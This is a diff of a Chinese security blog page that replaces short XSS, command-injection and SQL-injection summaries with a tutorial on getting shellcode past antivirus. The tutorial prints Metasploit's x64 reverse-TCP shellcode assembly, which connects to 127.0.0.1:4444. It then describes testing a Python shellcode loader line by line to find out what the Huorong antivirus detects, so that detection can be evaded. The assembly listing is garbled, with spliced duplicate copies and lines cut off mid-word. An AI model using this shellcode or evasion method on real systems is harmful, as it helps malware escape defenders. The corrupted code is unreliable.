@@ -6,15 +6,32 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://example.com">
-  <title>Solkatt的小窝</title>
+  <title>shellcode的基础免杀 | Solkatt的小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Solkatt的小窝">
-<meta property="og:url" content="https://example.com/page/4/index.html">
+  <meta name="description" content="杀毒软件基本原理学习免杀，就要先学习杀毒软件的基本原理。知己知彼才能百战百胜。 杀毒软件的基本等级1.无毒没有任何可疑行为，没有任何特征符合病毒。 2.可疑存在可疑行为:操作注册表，打开powershell，修改用户名，操作敏感文件等。 3.确认病毒特征符合病毒">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shellcode的基础免杀">
+<meta property="og:url" content="https://example.com/2022/03/21/shellcode%E7%9A%84%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80/index.html">
 <meta property="og:site_name" content="Solkatt的小窝">
+<meta property="og:description" content="杀毒软件基本原理学习免杀，就要先学习杀毒软件的基本原理。知己知彼才能百战百胜。 杀毒软件的基本等级1.无毒没有任何可疑行为，没有任何特征符合病毒。 2.可疑存在可疑行为:操作注册表，打开powershell，修改用户名，操作敏感文件等。 3.确认病毒特征符合病毒">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220321214026873.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220321214157754.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220321214237576.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220321214555428.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220321214624225.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220321214650192.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220321214731699.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220321214829765.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220321214836264.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220322205756511.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220322205816613.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220322205942280.png">
+<meta property="article:published_time" content="2022-03-21T08:20:28.000Z">
+<meta property="article:modified_time" content="2022-03-22T14:01:48.347Z">
 <meta property="article:author" content="Solkatt">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220321214026873.png">
   
     <link rel="alternative" href="/atom.xml" title="Solkatt的小窝" type="application/atom+xml">
   
@@ -142,221 +159,95 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-xss" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-shellcode的基础免杀" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/12/xss/">XSS</a>
+    <h1 class="article-title" itemprop="name">
+      shellcode的基础免杀
     </h1>
   
 
         
-        <a href="/2021/07/12/xss/" class="archive-article-date">
-  	<time datetime="2021-07-12T03:37:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-12</time>
+        <a href="/2022/03/21/shellcode%E7%9A%84%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80/" class="archive-article-date">
+  	<time datetime="2022-03-21T08:20:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-21</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="什么是XSS跨站点脚本攻击"><a href="#什么是XSS跨站点脚本攻击" class="headerlink" title="什么是XSS跨站点脚本攻击"></a>什么是XSS跨站点脚本攻击</h1><p>攻击者在被攻击的web服务器网页中嵌入恶意脚本，通常使用js编写的恶意代码，当用户使用浏览器访问被嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。XSS其实也是注入的一种，前端注入。（用户输入的传参会被当作前端代码执行）</p>
-<p>前端代码:HTML+CSS+JS</p>
-<p>XSS属于针对客户端的攻击，受害者最终是用户。</p>
-<p>网站管理人员也属于用户之一，攻击者可以通过XSS假冒管理员身份对网站实施攻击。</p>
-<p>如果我们想要进入管理员后台</p>
+        <h1 id="杀毒软件基本原理"><a href="#杀毒软件基本原理" class="headerlink" title="杀毒软件基本原理"></a>杀毒软件基本原理</h1><p>学习免杀，就要先学习杀毒软件的基本原理。知己知彼才能百战百胜。</p>
+<h2 id="杀毒软件的基本等级"><a href="#杀毒软件的基本等级" class="headerlink" title="杀毒软件的基本等级"></a>杀毒软件的基本等级</h2><h3 id="1-无毒"><a href="#1-无毒" class="headerlink" title="1.无毒"></a>1.无毒</h3><p>没有任何可疑行为，没有任何特征符合病毒。</p>
+<h3 id="2-可疑"><a href="#2-可疑" class="headerlink" title="2.可疑"></a>2.可疑</h3><p>存在可疑行为:操作注册表，打开powershell，修改用户名，操作敏感文件等。</p>
+<h3 id="3-确认病毒"><a href="#3-确认病毒" class="headerlink" title="3.确认病毒"></a>3.确认病毒</h3><p>特征符合病毒</p>
+<span id="more"></span>
+
+<h2 id="杀毒软件的常用识别方式"><a href="#杀毒软件的常用识别方式" class="headerlink" title="杀毒软件的常用识别方式"></a>杀毒软件的常用识别方式</h2><h3 id="1-静态"><a href="#1-静态" class="headerlink" title="1.静态"></a>1.静态</h3><p>通常通过反编译的方式查看源代码</p>
+<h4 id="1-1-代码中存在危险函数"><a href="#1-1-代码中存在危险函数" class="headerlink" title="1.1 代码中存在危险函数"></a>1.1 代码中存在危险函数</h4><p><code>virtualloc</code>，<code>rtlmovememort</code>,<code>ntcreatthread</code>等</p>
+<p>主要都是windowsapi函数，尤其是和内存，堆，线程相关的函数。</p>
+<p>当然在python中如果存在cmd等关键字也会被识别。比如<code>subprocess.popen(&quot;cmd /c&quot;)</code></p>
+<h4 id="1-2-shellcode的特征"><a href="#1-2-shellcode的特征" class="headerlink" title="1.2 shellcode的特征"></a>1.2 shellcode的特征</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">;-----------------------------------------------------------------------------;</span><br><span class="line">; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)</span><br><span class="line">; Compatible: Windows 7, 2003</span><br><span class="line">; Architecture: x64</span><br><span class="line">;-----------------------------------------------------------------------------;</span><br><span class="line">[BITS 64]</span><br><span class="line"></span><br><span class="line">; Input: RBP must be the address of &#x27;api_call&#x27;.</span><br><span class="line">; Output: RDI will be the socket for the connection to the server</span><br><span class="line">; Clobbers: RAX, RCX, RDX, RDI, R8, R9, R10, R12, R13, R14, R15</span><br><span class="line"></span><br><span class="line">reverse_tcp:</span><br><span class="line">  ; setup therevreverse_tcp:</span><br><span class="line">  ; setup the structures we need on the stack...</span><br><span class="line">  mov r14, &#x27;ws2_32&#x27;</span><br><span class="line">  push r14               ; Push the bytes &#x27;ws2_32&#x27;,0,0 onto the stack.</span><br><span class="line">  mov r14, rsp           ; save pointer to the &quot;ws2_32&quot; string for LoadLibraryA call.</span><br><span class="line">  sub rsp, 408+8         ; alloc sizeof( struct WSAData ) bytes for the WSAData structure (+8 for alignment)</span><br><span class="line">  mov r13, rsp           ; save pointer to the WSAData structure for WSAStartup call.</span><br><span class="line">  mov r12, 0x0100007F5C110002        </span><br><span class="line">  push r12               ; host 127.0.0.1, family AF_INET and port 4444</span><br><span class="line">  mov r12, rsp           ; save pointer to sockaddr struct for connect call</span><br><span class="line">  ; perform the call to LoadLibraryA...</span><br><span class="line">  mov rcx, r14           ; set the param for the library to load</span><br><span class="line">  mov r10d, 0x0726774C   ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )</span><br><span class="line">  call rbp               ; LoadLibraryA( &quot;ws2_32&quot; )</span><br><span class="line">  ; perform the call to WSAStartup...</span><br><span class="line">  mov rdx, r13           ; second param is a pointer to this stuct</span><br><span class="line">  push 0x0101            ;</span><br><span class="line">  pop rcx                ; set the param for the version requested</span><br><span class="line">  mov r10d, 0x006B8029   ; hash( &quot;ws2_32.dll&quot;, &quot;WSAStartup&quot; )</span><br><span class="line">  call rbp               ; WSAStartup( 0x0101, &amp;WSAData );</span><br><span class="line">  ; perform the call to WSASocketA...</span><br><span class="line">  push rax               ; if we succeed, rax wil be zero, push zero for the flags param.</span><br><span class="line">  push rax               ; push null for reserved parameter</span><br><span class="line">  xor r9, r9             ; we do not specify a WSAPROTOCOL_INFO structure</span><br><span class="line">  xor r8, r8             ; we do not specify a protocol</span><br><span class="line">  inc rax                ;</span><br><span class="line">  mov rdx, rax           ; push SOCK_STREAM</span><br><span class="line">  inc rax                ;</span><br><span class="line">  mov rcx, rax           ; push AF_INET</span><br><span class="line">  mov r10d, 0xE0DF0FEA   ; hash( &quot;ws2_32.dll&quot;, &quot;WSASocketA&quot; )</span><br><span class="line">  call rbp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );</span><br><span class="line">  mov rdi, rax           ; save the socket for later</span><br><span class="line">  ; perform the call to connect...</span><br><span class="line">  push byte 16           ; length of the sockaddr struct</span><br><span class="line">  pop r8                 ; pop off the third param</span><br><span class="line">  mov rdx, r12           ; set second param to pointer to sockaddr struct</span><br><span class="line">  mov rcx, rdi           ; the socket</span><br><span class="line">  mov r10d, 0x6174A599   ; hash( &quot;ws2_32.dll&quot;, &quot;connect&quot; )</span><br><span class="line">  call rbp               ; connect( s, &amp;sockaddr, 16 );</span><br><span class="line">  ; restore RSP so we dont have any alignment issues with the next block...</span><br><span class="line">  add rsp, ( (408+8) + (8*4) + (32*4) ) ; cleanup the stack allocationserse_tcp:</span><br><span class="line">  ; setup the structures we need on the stack...</span><br><span class="line">  mov r14, &#x27;ws2_32&#x27;</span><br><span class="line">  push r14               ; Push the bytes &#x27;ws2_32&#x27;,0,0 onto the stack.</span><br><span class="line">  mov r14, rsp           ; save pointer to the &quot;ws2_32&quot; string for LoadLibraryA call.</span><br><span class="line">  sub rsp, 408+8         ; alloc sizeof( struct WSAData ) bytes for the WSAData structure (+8 for alignment)</span><br><span class="line">  mov r13, rsp           ; save pointer to the WSAData structure for WSAStartup call.</span><br><span class="line">  mov r12, 0x0100007F5C110002        </span><br><span class="line">  push r12               ; host 127.0.0.1, family AF_INET and port 4444</span><br><span class="line">  mov r12, rsp           ; save pointer to sockaddr struct for connect call</span><br><span class="line">  ; perform the call to LoadLibraryA...</span><br><span class="line">  mov rcx, r14           ; set the param for the library to load</span><br><span class="line">  mov r10d, 0x0726774C   ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )</span><br><span class="line">  call rbp               ; LoadLibraryA( &quot;ws2_32&quot; )</span><br><span class="line">  ; perform the call to WSAStartup...</span><br><span class="line">  mov rdx, r13           ; second param is a pointer to this stuct</span><br><span class="line">  push 0x0101            ;</span><br><span class="line">  pop rcx                ; set the param for the version requested</span><br><span class="line">  mov r10d, 0x006B8029   ; hash( &quot;ws2_32.dll&quot;, &quot;WSAStartup&quot; )</span><br><span class="line">  call rbp               ; WSAStartup( 0x0101, &amp;WSAData );</span><br><span class="line">  ; perform the call to WSASocketA...</span><br><span class="line">  push rax               ; if we succeed, rax wil be zero, push zero for the flags param.</span><br><span class="line">  push rax               ; push null for reserved parameter</span><br><span class="line">  xor r9, r9             ; we do not specify a WSAPROTOCOL_INFO structure</span><br><span class="line">  xor r8, r8             ; we do not specify a protocol</span><br><span class="line">  inc rax                ;</span><br><span class="line">  mov rdx, rax           ; push SOCK_STREAM</span><br><span class="line">  inc rax                ;</span><br><span class="line">  mov rcx, rax           ; push AF_INET</span><br><span class="line">  mov r10d, 0xE0DF0FEA   ; hash( &quot;ws2_32.dll&quot;, &quot;WSASocketA&quot; )</span><br><span class="line">  call rbp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );</span><br><span class="line">  mov rdi, rax           ; save the socket for later</span><br><span class="line">  ; perform the call to connect...</span><br><span class="line">  push byte 16           ; length of the sockaddr struct</span><br><span class="line">  pop r8                 ; pop off the third param</span><br><span class="line">  mov rdx, r12           ; set second param to pointer to sockaddr struct</span><br><span class="line">  mov rcx, rdi           ; the socket</span><br><span class="line">  mov r10d, 0x6174A599   ; hash( &quot;ws2_32.dll&quot;, &quot;connect&quot; )</span><br><span class="line">  call rbp               ; connect( s, &amp;sockaddr, 16 );</span><br><span class="line">  ; restore RSP so we dont have any alignment issues with the next block...</span><br><span class="line">  add rsp, ( (408+8) + (8*4) + (32*4) ) ; cleanup the stack allocationss2_32&#x27;      ；将&#x27;ws2_32&#x27;字符复制到r14，类似于给它赋值</span><br><span class="line">  push r14               ; 把字符&#x27;ws2_32压入栈</span><br><span class="line">  mov r14, rsp           ; save pointer to the &quot;ws2_32&quot; string for LoadLibraryA call.</span><br><span class="line">  sub rsp, 408+8         ; alloc sizeof( struct WSAData ) bytes for the WSAData structure (+8 for alignment)</span><br><span class="line">  mov r13, rsp           ; save pointer to the WSAData structure for WSAStartup call.</span><br><span class="line">  mov r12, 0x0100007F5C110002        </span><br><span class="line">  push r12               ; host 127.0.0.1, family AF_INET and port 4444</span><br><span class="line">  mov r12, rsp           ; save pointer to sockaddr struct for connect call</span><br><span class="line">  ; perform the call to LoadLibraryA...</span><br><span class="line">  mov rcx, r14           ; set the param for the library to load</span><br><span class="line">  mov r10d, 0x0726774C   ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )</span><br><span class="line">  call rbp               ; LoadLibraryA( &quot;ws2_32&quot; )</span><br><span class="line">  ; perform the call to WSAStartup...</span><br><span class="line">  mov rdx, r13           ; second param is a pointer to this stuct</span><br><span class="line">  push 0x0101            ;</span><br><span class="line">  pop rcx                ; set the param for the version requested</span><br><span class="line">  mov r10d, 0x006B8029   ; hash( &quot;ws2_32.dll&quot;, &quot;WSAStartup&quot; )</span><br><span class="line">  call rbp               ; WSAStartup( 0x0101, &amp;WSAData );</span><br><span class="line">  ; perform the call to WSASocketA...</span><br><span class="line">  push rax               ; if we succeed, rax wil be zero, push zero for the flags param.</span><br><span class="line">  push rax               ; push null for reserved parameter</span><br><span class="line">  xor r9, r9             ; we do not specify a WSAPROTOCOL_INFO structure</span><br><span class="line">  xor r8, r8             ; we do not specify a protocol</span><br><span class="line">  inc rax                ;</span><br><span class="line">  mov rdx, rax           ; push SOCK_STREAM</span><br><span class="line">  inc rax                ;</span><br><span class="line">  mov rcx, rax           ; push AF_INET</span><br><span class="line">  mov r10d, 0xE0DF0FEA   ; hash( &quot;ws2_32.dll&quot;, &quot;WSASocketA&quot; )</span><br><span class="line">  call rbp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );</span><br><span class="line">  mov rdi, rax           ; save the socket for later</span><br><span class="line">  ; perform the call to connect...</span><br><span class="line">  push byte 16           ; length of the sockaddr struct</span><br><span class="line">  pop r8                 ; pop off the third param</span><br><span class="line">  mov rdx, r12           ; set second param to pointer to sockaddr struct</span><br><span class="line">  mov rcx, rdi           ; the socket</span><br><span class="line">  mov r10d, 0x6174A599   ; hash( &quot;ws2_32.dll&quot;, &quot;connect&quot; )</span><br><span class="line">  call rbp               ; connect( s, &amp;sockaddr, 16 );</span><br><span class="line">  ; restore RSP so we dont have any alignment issues with the next block...</span><br><span class="line">  add rsp, ( (408+8) + (8*4) + (32*4) ) ; cleanup the stack allocations</span><br></pre></td></tr></table></figure>
+
+<p>以msf中来讲，杀毒软件最常用就是判断<code>mov r10d</code>,<code>0x0726774C</code>等关键字来讲。通常杀毒软件很少会在汇编层面来检测，所以一般杀毒引擎都是通过shellcode中的特征码来识别。</p>
+<h4 id="1-3文件名称或md5"><a href="#1-3文件名称或md5" class="headerlink" title="1.3文件名称或md5"></a>1.3文件名称或md5</h4><p>文件名就不用多说了，md5主要是安全厂商从检测文件中截取一段特征码md5后来与病毒库中的md5进行比对。</p>
+<h4 id="1-4加密"><a href="#1-4加密" class="headerlink" title="1.4加密"></a>1.4加密</h4><p>使用加密解密行为或者对文件有额外保护措施都会被杀毒软件判为可疑。</p>
+<h3 id="2-动态"><a href="#2-动态" class="headerlink" title="2.动态"></a>2.动态</h3><p>通常动态都是静态分析之后做的。部分杀软会有沙盒。</p>
+<p>沙盒：也叫启发式查杀，通过模拟计算机的环境执行目标文件再观察特征。</p>
+<p>沙盒模拟的常见特征：</p>
 <ol>
-<li>通过后台地址，输入正确的账号。</li>
-<li>通过cookie（获得了管理员用户的权限）不用管理员账号密码进入后台。(这就是利用了XSS)</li>
+<li>内存较小，为了不占用计算机太多资源，沙盒通常一般非常小。</li>
+<li>时间较快，沙盒内置的时间速度比现实世界要快，提高查杀速度。</li>
+<li>进程或文件不完整，减少杀毒软件运行时对计算机的消耗。</li>
+<li>io设备确实，鼠标键盘等事件大部分沙盒都没有。</li>
 </ol>
-<h1 id="XSS攻击的危害"><a href="#XSS攻击的危害" class="headerlink" title="XSS攻击的危害"></a>XSS攻击的危害</h1><ol>
-<li><p>盗取用户cookie</p>
-</li>
-<li><p>修改网页内容</p>
-</li>
-<li><p>网站挂马</p>
-</li>
-<li><p>利用网站重定向</p>
-</li>
-<li><p>XSS蠕虫</p>
-</li>
+<h4 id="2-1计算机相关"><a href="#2-1计算机相关" class="headerlink" title="2.1计算机相关"></a>2.1计算机相关</h4><p>通常由r1或者r2层挂监控的方式(类似于hook)当触发这些条件就会产生事件。其中条件包括但不限于涉及到服务，注册表，组策略，防火墙，敏感程序(cmd,powershell,wmi,psexec,bitsadmin,rundll)，用户相关操作，敏感文件夹等。</p>
+<h4 id="2-2网络相关"><a href="#2-2网络相关" class="headerlink" title="2.2网络相关"></a>2.2网络相关</h4><ol>
+<li>ip，域名，证书匹配</li>
 </ol>
-        
-          <a class="article-more-a" href="/2021/07/12/xss/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/12/xss/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-命令注入漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/12/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">命令注入漏洞</a>
-    </h1>
-  
-
-        
-        <a href="/2021/07/12/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2021-07-12T01:42:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="漏洞产生原因："><a href="#漏洞产生原因：" class="headerlink" title="漏洞产生原因："></a>漏洞产生原因：</h2><p>在web程序中，有些功能需求web前端传递参数到后台服务器上执行（特别是一些网络设备的web管理界面，如路由器，交换机等），但由于开发人员没有对输入进行严格的过滤，导致了攻击者可以构造一些额外的“带有非法目的”（比如建立用户账户，越权等）命令，欺骗后台服务器执行。</p>
-<h2 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h2><p>如果Web应用使用的是root权限，则该漏洞可以导致攻击者在服务器上执行任意命令。</p>
-        
-          <a class="article-more-a" href="/2021/07/12/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/12/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-SQL注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/11/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
-    </h1>
-  
-
-        
-        <a href="/2021/07/11/SQL%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-  	<time datetime="2021-07-11T08:20:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="SQL注入本质"><a href="#SQL注入本质" class="headerlink" title="SQL注入本质"></a>SQL注入本质</h1><p>注入攻击的本质，是把用户输入的数据当作代码执行。</p>
-<p>这里有两个关键条件：</p>
-<ol>
-<li>第一个是用户能够控制输入</li>
-<li>第二个是原本程序要执行的代码，拼接了用户输入的数据然后进行执行</li>
+<p>查找通讯的ip或域名是否之前存在攻击行为。</p>
+<ol start="2">
+<li>流量内容</li>
 </ol>
-<h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p>数字型注入</p>
-<p>SELECT first_name,last_name FROM users WHERE user_id=$id</p>
-<p>字符型注入</p>
-<p>SELECT first_name,last_name FROM users WHERE user_id=’$id’</p>
-<p>无论何种类型，都可以通过直接输入单引号来判断是否存在注入点。可以分别输入3和1+2，根据显示结果来判断数据类型。</p>
-<p>如果是数字型，则会做运算，如果没做，则反之。</p>
-<p>字符型注入最关键的是如何闭合SQL语句以及注释多余的代码。</p>
-<p>SELECT first_name,last_name FROM users WHERE user_id=’ ‘or 1=1 or’ ‘</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; order by 1#`;(按照Mysql语法，#后面会被注释掉，使用这种方法屏蔽掉后面的单引号，避免语法错误)</span><br></pre></td></tr></table></figure>
+<p>时间特征：扫描相关</p>
+<p>内容特征：命令关键词</p>
+<p>结构特征：已知市场软件等相关特征</p>
+<h1 id="针对杀毒软件的特点来做免杀"><a href="#针对杀毒软件的特点来做免杀" class="headerlink" title="针对杀毒软件的特点来做免杀"></a>针对杀毒软件的特点来做免杀</h1><h2 id="思路-控制变量法-："><a href="#思路-控制变量法-：" class="headerlink" title="思路(控制变量法)："></a>思路(控制变量法)：</h2><ol>
+<li>寻找特点</li>
+<li>思考可替换的方式</li>
+<li>尝试代码</li>
+</ol>
+<h2 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h2><p>头一次我们的shellcode一运行就被火绒屠杀掉了。我们可以根据控制变量法来判断火绒到底是通过什么来杀的shellcode。再静态查杀中，火绒可能会识别1.代码中的危险函数 2.shellcode的特征 3.文件名称</p>
+<p>那么我们可以怎么办呢？我们可以通过注释源代码进行一行一行的扫描来判断火绒到底再以什么特征屠杀shellcode。</p>
+<p>原始模板被扫描就会报毒：</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220321214026873.png" alt="image-20220321214026873"></p>
+<p>接着我们首先来判断shellcode是否被杀掉。先把除了shellcode的都给删除。这里不能在<code>pycharm</code>中使用注释，因为照样会被读到注释内容。</p>
+<p>首先只留下shellcode</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220321214157754.png" alt="image-20220321214157754"></p>
+<p>然后进行扫描，发现火绒并没有报毒，说明火绒并不是以shellcode为特征来进行扫描。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220321214237576.png" alt="image-20220321214237576"></p>
+<p>接下来测试是否是危险函数的原因，我们需要一排一排的读函数。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220321214555428.png" alt="image-20220321214555428"></p>
+<p>仍然没有报毒</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220321214624225.png" alt="image-20220321214624225"></p>
+<p>查看下一行。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220321214650192.png" alt="image-20220321214650192"></p>
